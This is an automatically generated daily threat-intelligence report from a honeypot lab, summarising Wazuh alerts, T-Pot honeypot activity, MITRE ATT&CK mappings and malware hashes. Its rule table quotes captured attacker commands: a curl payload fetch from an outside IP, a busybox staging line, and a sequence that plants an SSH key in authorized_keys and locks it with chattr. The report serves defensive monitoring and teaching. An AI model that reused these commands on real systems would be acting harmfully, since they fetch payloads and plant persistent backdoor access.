# LearningLab01 Daily Threat Intelligence Report — 2026-09-09

Generated: 2026-09-09T13:15:05.052Z

Report window: 2026-09-08T13:15:05.025Z through 2026-09-09T13:15:05.025Z

> This report summarizes security telemetry and honeypot activity. An alert indicates that a rule matched observed activity; it does not automatically prove that a system was compromised.

## Executive Summary

| Metric | Count |
|---|---:|
| Wazuh alerts | 87,325 |
| Attack-related alerts | 20,024 |
| Honeypot interactions | 81,768 |
| Authentication failures | 1,785 |
| Authentication successes | 490 |
| Critical alerts | 18 |
| High alerts | 236 |
| T-Pot artifacts observed | 19 |
| Malicious artifact detections | 19 |

### Notable Observations

- 18 critical-severity alerts require priority review.
- 236 high-severity alerts should be reviewed after the critical queue.
- Authentication failures exceeded successful authentications by a ratio of 3.64:1.
- Country attribution currently covers only 6.20% of alerts. Country totals should be treated as partial telemetry.
- The most frequent rule was 110213: T-Pot RDP connection from [IP address] to port 3389. (39,153 alerts).

## Wazuh Security Monitoring

### Alert Severity

| Severity | Alerts | Percentage |
|---|---:|---:|
| Critical | 18 | 0.02% |
| High | 236 | 0.27% |
| Medium | 1,071 | 1.23% |
| Low | 86,000 | 98.48% |
| Informational | 0 | 0.00% |

Severity represents the priority assigned by the Wazuh rule. Critical and high alerts should be investigated first, but repeated lower-severity events can also reveal scanning, credential attacks, or attacker preparation.

### Authentication Activity

- Authentication failures: 1,785
- Authentication successes: 490
- Failure-to-success ratio: 3.64:1

A successful authentication is not considered an attack by itself. Analysts should correlate successful logins with preceding failures, source addresses, usernames, target systems, and expected activity.

### Attack-Type Breakdown

| Category | Alerts | Percentage of attack-related alerts |
|---|---:|---:|
| Network attack | 16,590 | 82.85% |
| Payload delivery | 16,590 | 82.85% |
| Authentication failure | 1,785 | 8.91% |
| Web attack | 729 | 3.64% |
| Reconnaissance | 364 | 1.82% |
| Command execution | 333 | 1.66% |
| SMTP attack | 173 | 0.86% |
| Malware | 57 | 0.28% |
| Network scan | 44 | 0.22% |

> Category counts may overlap because one Wazuh alert can belong to multiple rule groups. The attack-related total counts each alert once.

### Country of Origin

Wazuh supplied country information for 5,415 alerts, representing 6.20% of all alerts.

| Country | Alerts | Percentage of all alerts | Relative volume |
|---|---:|---:|---|
| Unknown | 81,910 | 93.80% | Not geolocated |
| New Zealand | 2,577 | 2.95% | ████████████████████ |
| United States | 2,575 | 2.95% | ████████████████████ |
| United Kingdom | 200 | 0.23% | ██ |
| Turkey | 20 | 0.02% | █ |
| China | 13 | 0.01% | █ |
| Canada | 6 | 0.01% | █ |
| Germany | 6 | 0.01% | █ |
| Romania | 6 | 0.01% | █ |
| Australia | 5 | 0.01% | █ |
| Iran | 2 | 0.00% | █ |
| Russia | 2 | 0.00% | █ |
| Bulgaria | 1 | 0.00% | █ |
| Switzerland | 1 | 0.00% | █ |
| Ukraine | 1 | 0.00% | █ |

> Relative-volume bars compare only countries with known geographic attribution. Unknown alerts are excluded from the bar scale.

> Geolocation is approximate. VPNs, proxies, cloud providers, compromised hosts, carrier networks, and incomplete GeoIP coverage can make the apparent country different from the attacker’s location.

### MITRE ATT&CK Tactics

| Tactic | Alerts |
|---|---:|
| Defense Evasion | 475 |
| Privilege Escalation | 474 |
| Initial Access | 419 |
| Persistence | 406 |
| Lateral Movement | 117 |
| Credential Access | 50 |
| Execution | 46 |
| Command and Control | 25 |
| Impact | 21 |

### MITRE ATT&CK Techniques

| Technique | Alerts |
|---|---:|
| Valid Accounts | 405 |
| Remote Services | 117 |
| Sudo and Sudo Caching | 69 |
| Brute Force | 50 |
| Command and Scripting Interpreter | 46 |
| Ingress Tool Transfer | 25 |
| Stored Data Manipulation | 21 |
| Exploit Public-Facing Application | 14 |
| Create Account | 1 |
| Disable or Modify Tools | 1 |

MITRE ATT&CK describes adversary behavior rather than declaring that an attack succeeded. These mappings help analysts connect individual alerts to possible attacker objectives and investigative hypotheses.

### Most Frequent Wazuh Rules

| Rule ID | Highest Level | Alerts | Description | Agents |
|---|---:|---:|---|---|
| 110213 | 4 | 39,153 | T-Pot RDP connection from [IP address] to port 3389. | tpot (39,153) |
| 110205 | 6 | 16,533 | T-Pot Honeytrap received a payload from [IP address] | tpot (16,533) |
| 110207 | 5 | 10,281 | T-Pot SentryPeer SIP activity from [IP address]:63356, method INVITE | tpot (10,281) |
| 110204 | 4 | 7,820 | T-Pot Honeytrap connection from [IP address] to port 2222 | tpot (7,820) |
| 110219 | 4 | 5,333 | T-Pot CiscoASA web activity from [IP address]: Request timed out: TimeoutError('The read operation timed out') | tpot (5,333) |
| 110101 | 3 | 2,203 | Cowrie SSH connection from [IP address]. | tpot (2,203) |
| 110102 | 5 | 1,785 | Cowrie failed login from [IP address] using username casia. | tpot (1,785) |
| 110201 | 4 | 756 | T-Pot Dionaea pptpd connection from [IP address] to port 1723 | tpot (756) |
| 110223 | 5 | 717 | T-Pot HoneyAML received GET request from [IP address] to /fetch on port 3000. | tpot (717) |
| 110216 | 4 | 380 | T-Pot Mailoney received SMTP command from [IP address]: EHLO User  | tpot (380) |
| 5501 | 3 | 288 | PAM: Login session opened. | tpot (206), wazuh (82) |
| 110104 | 7 | 286 | Cowrie captured a command from [IP address]: config terminal | tpot (286) |
| 5502 | 3 | 266 | PAM: Login session closed. | tpot (189), wazuh (77) |
| 533 | 7 | 241 | Listened ports status (netstat) changed (new port opened or closed). | tpot (240), wazuh (1) |
| 110217 | 7 | 173 | T-Pot Mailoney captured suspicious SMTP activity from [IP address]: AUTH LOGIN  | tpot (173) |
| 110209 | 5 | 147 | T-Pot Conpot snmp event from [IP address]: SNMPv2 Bulk | tpot (147) |
| 110215 | 4 | 126 | T-Pot MiniPrint event: command_received, action request, Request received | tpot (126) |
| 110221 | 7 | 126 | T-Pot CiscoASA detected configuration discovery from [IP address]: "GET /appGet.cgi?hook=get_cfg_clientlist() HTTP/1.1" 404 - | tpot (126) |
| 5715 | 3 | 117 | sshd: authentication success. | tpot (110), wazuh (7) |
| 110103 | 10 | 85 | Cowrie accepted login from [IP address] using username root. | tpot (85) |
| 110220 | 8 | 74 | T-Pot CiscoASA captured a login request from [IP address]: "POST /login.cgi HTTP/1.1" 200 - | tpot (74) |
| 5402 | 3 | 69 | Successful sudo to ROOT executed. | wazuh (69) |
| 110212 | 10 | 57 | T-Pot Honeytrap detected repeated payload activity from [IP address]. | tpot (57) |
| 110106 | 10 | 50 | Cowrie detected repeated failed logins from [IP address]. | tpot (50) |
| 510 | 7 | 41 | Host-based anomaly detection event (rootcheck). | wazuh (40), tpot (1) |
| 110214 | 9 | 37 | T-Pot RDP honeypot detected a connection burst from [IP address]. | tpot (37) |
| 110108 | 12 | 32 | Cowrie captured suspicious execution or staging activity from [IP address]: >/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x43\x4c\x53\x49\x4f\x4c' | tpot (32) |
| 110208 | 7 | 18 | T-Pot SentryPeer detected SIP scanner friendly-scanner from [IP address]:5093 | tpot (18) |
| 110225 | 13 | 14 | T-Pot HoneyAML detected a probable remote-code-execution and payload-delivery attempt from [IP address]. | tpot (14) |
| 110224 | 7 | 12 | T-Pot HoneyAML received an HTTP POST from [IP address] to /fetch. | tpot (12) |
| 110107 | 12 | 11 | Cowrie captured a probable payload-retrieval command from [IP address]: curl -O http://[IP address]/ok | tpot (11) |
| 592 | 8 | 11 | Log file size reduced. | tpot (11) |
| 550 | 7 | 10 | Integrity checksum changed. | wazuh (10) |
| 203 | 9 | 9 | Agent event queue is full. Events may be lost. | tpot (9) |
| 202 | 7 | 8 | Agent event queue is 90% full. | tpot (8) |
| 205 | 3 | 8 | Agent event queue is back to normal load. | tpot (8) |
| 110211 | 9 | 7 | T-Pot Dionaea detected a connection burst from [IP address]. | tpot (7) |
| 554 | 5 | 6 | File added to the system. | wazuh (6) |
| 2902 | 7 | 5 | New dpkg (Debian Package) installed. | wazuh (5) |
| 2904 | 7 | 5 | Dpkg (Debian Package) half configured. | wazuh (5) |
| 110109 | 13 | 4 | Cowrie captured a destructive, persistence, or defense-evasion command from [IP address]: chmod +x clean.sh; sh clean.sh; rm -rf clean.sh; chmod +x setup.sh; sh setup.sh; rm -rf setup.sh; mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqHrvnL6l7rT/mt1AdgdY9tC1GPK216q0q/7neNVqm7AgvfJIM3ZKniGC3S5x6KOEApk+83GM4IKjCPfq007SvT07qh9AscVxegv66I5yuZTEaDAG6cPXxg3/0oXHTOTvxelgbRrMzfU5SEDAEi8+ByKMefE+pDVALgSTBYhol96hu1GthAMtPAFahqxrvaRR4nL4ijxOsmSLREoAb1lxiX7yvoYLT45/1c5dJdrJrQ60uKyieQ6FieWpO2xF6tzfdmHbiVdSmdw0BiCRwe+fuknZYQxIC1owAj2p5bc+nzVTi3mtBEk9rGpgBnJ1hcEUslEf/zevIcX8+6H7kUMRr rsa-key-20230629" > ~/.ssh/authorized_keys; chattr +ai ~/.ssh/authorized_keys; uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A" | tpot (4) |
| 2901 | 3 | 3 | New dpkg (Debian Package) requested to install. | wazuh (3) |
| 86003 | 3 | 3 | Docker: Error message | tpot (3) |
| 11 | 4 | 2 | Unknown | tpot (2) |
| 110222 | 9 | 2 | T-Pot CiscoASA detected repeated web requests from one source. | tpot (2) |
| 19004 | 7 | 2 | SCA summary: CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Score less than 50% (47) | tpot (2) |
| 110218 | 9 | 1 | T-Pot Mailoney detected repeated SMTP activity from one source. | tpot (1) |
| 110226 | 10 | 1 | T-Pot HoneyAML detected repeated web requests from one source. | tpot (1) |
| 19010 | 3 | 1 | CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Ensure nftables default deny firewall policy.: Status changed from failed to passed | tpot (1) |
| 19011 | 9 | 1 | CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Ensure nftables default deny firewall policy.: Status changed from passed to failed | tpot (1) |
| 503 | 3 | 1 | Wazuh agent started. | tpot (1) |
| 506 | 3 | 1 | Wazuh agent stopped. | tpot (1) |
| 5901 | 8 | 1 | New group added to the system. | wazuh (1) |
| 5902 | 8 | 1 | New user added to the system. | wazuh (1) |
| 591 | 3 | 1 | Log file rotated. | tpot (1) |

### New or Previously Unseen Detections

Historical novelty comparison is not enabled in the exporter yet. This section will compare the current report window with the preceding 30-day baseline. Until that comparison is enabled, no rule should be described as new solely because it appears in this report.

### SOC Analyst Learning Notes

1. Begin with critical and high alerts, but validate the underlying event.
2. Determine whether the event represents scanning, attempted access, payload delivery, execution, persistence, or impact.
3. Correlate source IP, username, target, timestamp, and related alerts.
4. Check whether a successful login followed repeated failures.
5. Separate honeypot interaction from activity against production assets.
6. Document evidence supporting both malicious and benign explanations.
7. Escalate based on confirmed risk, affected assets, and confidence—not alert volume alone.

## T-Pot Artifact Intelligence

### Artifact Summary

- Artifacts observed: 19
- Known hashes: 19
- Uploaded or analyzed: 0
- Malicious detections: 19
- Suspicious detections: 0
- Lookup errors: 0

### Artifacts

| SHA-256 | Bytes | Status | Malicious | Suspicious | Undetected | VirusTotal |
|---|---:|---|---:|---:|---:|---|
| 94f2e4d8d4436874785cd14e6e6d403507b8750852f7f2040352069a75da4c00 | 30304472 | known | 46 | 0 | 17 | [Open](https://www.virustotal.com/gui/file/94f2e4d8d4436874785cd14e6e6d403507b8750852f7f2040352069a75da4c00) |
| 0d3c687ffc30e185b836b99bd07fa2b0d460a090626f6bbbd40a95b98ea70257 | 46525 | known | 45 | 0 | 19 | [Open](https://www.virustotal.com/gui/file/0d3c687ffc30e185b836b99bd07fa2b0d460a090626f6bbbd40a95b98ea70257) |
| 76ae6d577ba96b1c3a1de8b21c32a9faf6040f7e78d98269e0469d896c29dc64 | 239388 | known | 39 | 0 | 22 | [Open](https://www.virustotal.com/gui/file/76ae6d577ba96b1c3a1de8b21c32a9faf6040f7e78d98269e0469d896c29dc64) |
| d166541ec5b322c7bafea156ef89a99f7255c78da2c2fc5e6ef0546892e692b1 | 28147712 | known | 38 | 0 | 24 | [Open](https://www.virustotal.com/gui/file/d166541ec5b322c7bafea156ef89a99f7255c78da2c2fc5e6ef0546892e692b1) |
| d7188b8c575367e10ea8b36ec7cca067ef6ce6d26ffa8c74b3faa0b14ebb8ff0 | 153208 | known | 36 | 0 | 22 | [Open](https://www.virustotal.com/gui/file/d7188b8c575367e10ea8b36ec7cca067ef6ce6d26ffa8c74b3faa0b14ebb8ff0) |
| 8e1a67a5c03b3cd818f046c7a1605afccc0ee5ce437a0d099881f1872b54bc70 | 1838060 | known | 35 | 0 | 28 | [Open](https://www.virustotal.com/gui/file/8e1a67a5c03b3cd818f046c7a1605afccc0ee5ce437a0d099881f1872b54bc70) |
| d70f917e35813a7ae323e6b2b539d6dbbfc3a3a6599f1fed93430b14ca08b141 | 1448252 | known | 35 | 0 | 28 | [Open](https://www.virustotal.com/gui/file/d70f917e35813a7ae323e6b2b539d6dbbfc3a3a6599f1fed93430b14ca08b141) |
| 7a656791b445fff02ac6e9dd1081cc265db935476a9ee71139cb6aef52102e2b | 231196 | known | 34 | 0 | 28 | [Open](https://www.virustotal.com/gui/file/7a656791b445fff02ac6e9dd1081cc265db935476a9ee71139cb6aef52102e2b) |
| 3f3bf218089d1488617d37f8a5116bb2791eb39ce06a1b5bc9a4cdfe5e94dd39 | 1759768 | known | 34 | 0 | 28 | [Open](https://www.virustotal.com/gui/file/3f3bf218089d1488617d37f8a5116bb2791eb39ce06a1b5bc9a4cdfe5e94dd39) |
| f0aa83bbbd2c75e2f71ec16029ee5fcfad59f3a8efa30a500b815f0f6c18d987 | 1989056 | known | 33 | 0 | 30 | [Open](https://www.virustotal.com/gui/file/f0aa83bbbd2c75e2f71ec16029ee5fcfad59f3a8efa30a500b815f0f6c18d987) |
| d1cac82f44b54b0fd244a9e4122811e9ae108a197c7a65a20fd2e7552683e68e | 1696412 | known | 32 | 0 | 30 | [Open](https://www.virustotal.com/gui/file/d1cac82f44b54b0fd244a9e4122811e9ae108a197c7a65a20fd2e7552683e68e) |
| 2779ac942a1c5d8f07f6eec7d4707d1bf2583760029573da7fd23210084fa405 | 1399 | known | 31 | 0 | 30 | [Open](https://www.virustotal.com/gui/file/2779ac942a1c5d8f07f6eec7d4707d1bf2583760029573da7fd23210084fa405) |
| e7061379de0d12588c9d833b912a05e3835c9dc630902c8d10b460ec972f0298 | 1444 | known | 28 | 0 | 32 | [Open](https://www.virustotal.com/gui/file/e7061379de0d12588c9d833b912a05e3835c9dc630902c8d10b460ec972f0298) |
| 1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d | 2126 | known | 27 | 0 | 32 | [Open](https://www.virustotal.com/gui/file/1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d) |
| 2d41372a3ee70895ee6be05e3a94d460dc9a2feb61b9fb907f3155e0c120c992 | 1519 | known | 23 | 0 | 36 | [Open](https://www.virustotal.com/gui/file/2d41372a3ee70895ee6be05e3a94d460dc9a2feb61b9fb907f3155e0c120c992) |
| e3ac3cffebd0089e011b524e399f02cfe444d55a57c3f1b13cf1676baf87eb32 | 1608 | known | 20 | 0 | 38 | [Open](https://www.virustotal.com/gui/file/e3ac3cffebd0089e011b524e399f02cfe444d55a57c3f1b13cf1676baf87eb32) |
| 3f3a11bafabb1a35db913cfe51995f2e357d049e268860175876ae5a93d23892 | 1157 | known | 20 | 0 | 40 | [Open](https://www.virustotal.com/gui/file/3f3a11bafabb1a35db913cfe51995f2e357d049e268860175876ae5a93d23892) |
| 26e72314a3c85dcd726ce1119d35279cb252d296cbe95504addd948ad32da9cc | 46720 | known | 14 | 0 | 48 | [Open](https://www.virustotal.com/gui/file/26e72314a3c85dcd726ce1119d35279cb252d296cbe95504addd948ad32da9cc) |
| a1b6223a3ecb37b9f7e4a52909a08d9fd8f8f80aee46466127ea0f078c7f5437 | 334816 | known | 2 | 0 | 57 | [Open](https://www.virustotal.com/gui/file/a1b6223a3ecb37b9f7e4a52909a08d9fd8f8f80aee46466127ea0f078c7f5437) |

## Security Onion Network Monitoring

_Planned integration._

This section will eventually contain Suricata alerts, Zeek observations, network attack types, source-country information, targeted services, new network behaviors, and correlations with Wazuh endpoint alerts.

## Report Limitations

- Alert counts represent rule matches, not necessarily unique attackers.
- Attack-category counts may overlap.
- Honeypot traffic is intentionally exposed and is not equivalent to a compromise of a production system.
- GeoIP attribution is approximate and currently has incomplete coverage.
- VirusTotal results can change as vendors update their detections.

Generated automatically by the LearningLab01 threat-intelligence pipeline.
